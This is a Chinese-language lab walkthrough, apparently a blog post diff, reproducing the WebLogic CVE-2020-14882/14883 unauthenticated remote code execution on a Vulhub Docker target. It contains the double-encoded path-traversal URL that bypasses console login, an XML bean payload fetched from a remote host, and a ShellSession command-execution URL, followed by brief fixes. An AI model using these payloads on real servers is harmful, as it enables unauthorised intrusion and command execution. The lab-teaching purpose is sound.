@@ -191,35 +191,106 @@ Weblogic 未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）
 
 
 
+### 环境搭建
 
+Vulhub 是一个漏洞测试靶场平台，利用 `docker compose` 可以一键启动漏洞测试靶场。
 
+下载 [Vulhub](https://vulhub.org/) 到本地：`git clone https://github.com/vulhub/vulhub.git  `
 
+进入到我们的目标漏洞位置：`cd vulhub/weblogic/CVE-2020-14882/`
 
+查看当前的 `docker-compose.yml`：
 
+```yaml
+version: '2'
+services:
+ weblogic:
+   image: vulhub/weblogic:12.2.1.3-2018
+   ports:
+    - "7001:7001"
+```
 
+>  可以修改映射端口号
 
+启动容器：`docker compose up -d`
 
+访问 `http://YOUR_IP_ADDRESS:PORT/console`：
 
+![](http://img.wukaipeng.com/2023/11/07-070126-2urR2E-image-20231107070126724.png)
 
+停止容器：`docker compose stop`
 
+删除容器：`docker compose down`
 
+### CVE-2020-14882
 
+访问：
 
+- `http://YOUR_IP_ADDRESS:PORT/console/css/%252e%252e%252fconsole.portal`
+- `http://YOUR_IP_ADDRESS:PORT/console/images/%252e%252e%252fconsole.portal`
 
+其中 `%252e%252e%252f` 是 `../.` 进行两次 URL 编码，通过这个可以实现路径穿越，可未授权直接访问后台。
 
+![](http://img.wukaipeng.com/2023/11/07-070820-wnOWJt-image-20231107070820297.png)
 
+目前权限不足，要想实现 RCE 需要借助另外一个漏洞。
 
+### CVE-2020-14883
 
+**利用方式一 ：**
 
+利用类 `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` 反序列化漏洞上传文件，这是一个通杀的漏洞，所有版本都适用：
 
+新建一个 `rce.xml` 文件
 
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+          <list>
+            <value>bash</value>
+            <value>-c</value>
+            <value><![CDATA[touch /tmp/wukaipeng]]></value>
+          </list>
+        </constructor-arg>
+    </bean>
+</beans>
+```
 
+然后利用 DVWA 上传，得到公网可访问链接 `http://DVWA_IP_ADDERSS:PORT/hackable/uploads/rce.xml`
 
+![](http://img.wukaipeng.com/2023/11/07-071901-1rD79B-image-20231107071900897.png)
 
+访问：`http://YOUR_IP_ADDRESS/console/images/%252e%252e%252fconsole.portal?
+_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.su
+pport.FileSystemXmlApplicationContext("http://example.com/rce.xml")`
 
+其中 `http://example.com/rce.xml` 替换成刚才上传的地址：
 
+![](http://img.wukaipeng.com/2023/11/07-074256-mEVN6R-image-20231107074256077.png)
 
+去到容器中，可以看到我们的文件也上传成功了：
 
+![](http://img.wukaipeng.com/2023/11/07-074418-NlE1jX-image-20231107074418579.png)
+
+---
+
+**利用方式二：**
+
+利用类 `com.tangosol.coherence.mvel2.sh.ShellSession` 实现，Weblogic 12.2.1 以上适用
+
+```
+http://YOUR_IP_ADDRESS:PORT/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/wukaipeng2');")
+```
+
+![](http://img.wukaipeng.com/2023/11/07-074958-3WX5N3-image-20231107074958334.png)
+
+### 修复
+
+1️⃣ 非必要不开启 console
+
+2️⃣ 升级最新版本
 
 
 
